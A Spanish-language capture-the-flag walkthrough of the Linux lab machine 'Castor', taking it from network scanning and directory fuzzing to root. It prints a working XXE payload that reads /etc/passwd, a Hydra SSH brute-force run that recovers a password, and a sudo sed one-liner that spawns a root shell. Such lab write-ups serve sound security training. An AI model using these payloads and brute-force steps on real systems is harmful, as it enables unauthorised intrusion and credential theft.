---
icon: linux
---

**Plataforma:** The Hackers Labs\
**Sistema Operativo:** Linux

> **Tags:** `Linux` `XXE` `Burp Suite` `Hydra` `Sudoers` `Information Leakage`

## INSTALACIÓN

Descargamos el archivo `zip` que contiene la `.ova` de la máquina Castor, lo extraemos y la importamos en VirtualBox.

Configuramos la interfaz de red de la máquina Castor y la iniciamos junto a nuestra máquina atacante.

## RECONOCIMIENTO DE HOSTS

En este punto, aún desconocemos la dirección `IP` asignada a la máquina, por lo que procedemos a descubrirla:

```bash
netdiscover -i eth1 -r 10.0.0.0/16
```

Info:

```
Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts               
                                                                               
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.4.1        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.3        08:00:27:29:62:45      1      60  PCS Systemtechnik GmbH      
 10.0.4.40       08:00:27:51:76:30      1      60  PCS Systemtechnik GmbH
```

Identificamos con seguridad que la `IP` de la víctima es `10.0.4.40`.

## ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para identificar qué puertos están abiertos, seguido de un escaneo más exhaustivo para enumerar las versiones y servicios que corren en ellos.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.40
```

```bash
nmap -n -Pn -sCV -p21,80,139,445 --min-rate 5000 10.0.4.40
```

Info:

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-26 03:34 +0100
Nmap scan report for 10.0.4.40
Host is up (0.00020s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: CastorTech | Madera Sostenible
MAC Address: 08:00:27:51:76:30 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.66 seconds
```

Identificamos los puertos `22` (SSH) y `80` (HTTP) abiertos.

Accedemos al servicio web del puerto `80` y encontramos la siguiente página.

![](../../images/castor.png)

A primera vista, no localizamos información relevante que nos sugiera un vector de ataque claro.

## GOBUSTER

Realizamos `fuzzing` de directorios para intentar localizar directorios o archivos ocultos.

```bash
gobuster dir -u http://10.0.4.40 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,zip,php,txt,bak,sh -b 403,404 -t 60
```

Info:

```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.4.40
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,zip,php,txt,bak,sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 5070]
/uploads              (Status: 301) [Size: 308] [--> http://10.0.4.40/uploads/]
/upload.php           (Status: 200) [Size: 16]
/css                  (Status: 301) [Size: 304] [--> http://10.0.4.40/css/]
/js                   (Status: 301) [Size: 303] [--> http://10.0.4.40/js/]
Progress: 254409 / 1543906 (16.48%)
```

Encontramos un directorio `/uploads` vacío y un archivo llamado `upload.php`.

Al acceder a `upload.php`, nos encontramos con el mensaje:

```
xml not provided
```

Esto nos indica que el servidor espera recibir datos en formato `XML`.

## EXPOTACIÓN XXE

Interceptamos la petición con `Burp Suite`.

![](../../images/requestcastor.png)

La enviamos al `Repeater` con `Ctrl + R` para realizar pruebas.

En primer lugar, observamos que el navegador realiza por defecto una petición `GET`, por lo que el servidor no está recibiendo ningún dato en el cuerpo de la solicitud.

Dado que el sistema solicita una entrada `XML`, sospechamos que podría ser vulnerable a un ataque `XXE` (XML External Entity).

Para comprobarlo, cambiamos el método de `GET` a `POST` y añadimos la cabecera `Content-Type: application/xml`.

Por último, inyectamos un payload `XML` malicioso que define una entidad externa `&xxe;` apuntando al archivo local `/etc/passwd`.

Al procesar el `XML`, el servidor sustituye la entidad por el contenido del archivo solicitado.

Petición:

```xml
POST /upload.php HTTP/1.1
Host: 10.0.4.40
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/xml
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Length: 145

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>
  <name>&xxe;</name>
</root>
```

![](../../images/burpcastor.png)

¡Ha funcionado! El servidor ha procesado el `XML` correctamente y nos ha devuelto el contenido del archivo `/etc/passwd`.

Observamos que existe un usuario en el sistema llamado `castorcin`.

## FUERZA BRUTA

Procedemos a realizar un ataque de fuerza bruta con el usuario castorcin contra el servicio `SSH` utilizando `Hydra`.

```bash
hydra -l castorcin -P /usr/share/wordlists/rockyou.txt ssh://10.0.4.40 -t 50
```

Info:

```
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-26 03:58:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 50 tasks per 1 server, overall 50 tasks, 14344399 login tries (l:1/p:14344399), ~286888 tries per task
[DATA] attacking ssh://10.0.4.40:22/
[22][ssh] host: 10.0.4.40   login: castorcin   password: chocolate
1 of 1 target successfully completed, 1 valid password found
```

Tras unos instantes, encontramos credenciales válidas para el usuario `castorcin` : `chocolate`.

Accedemos mediante `SSH`.

```bash
ssh castorcin@10.0.4.40
```

## ESCALADA DE PRIVILEGIOS

Comprobamos permisos `sudo` y `SUID`.

```bash
sudo -l
```

Info:

```
Matching Defaults entries for castorcin on TheHackersLabs-Castor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User castorcin may run the following commands on TheHackersLabs-Castor:
    (ALL : ALL) NOPASSWD: /usr/bin/sed
```

Identificamos que podemos ejecutar el binario `sed` con privilegios de `root`. Consultando la página de `GTFOBins`, encontramos el comando necesario para explotar esta configuración y escalar privilegios con éxito.

```bash
sudo /usr/bin/sed -n '1e exec /bin/sh 1>&0' /etc/hosts
```

Info:

```
sudo: unable to resolve host TheHackersLabs-Castor: Nombre o servicio desconocido
# whoami
root
#
```

Ya somos root!

Por último, obtenemos las `flags` de usuario y root.

```
# cat /home/castorcin/user.txt
THL{JDBNASJ-----dkasdaCastorcito}
# cat /root/root.txt
THL{asdma-------kCASTOR}
```
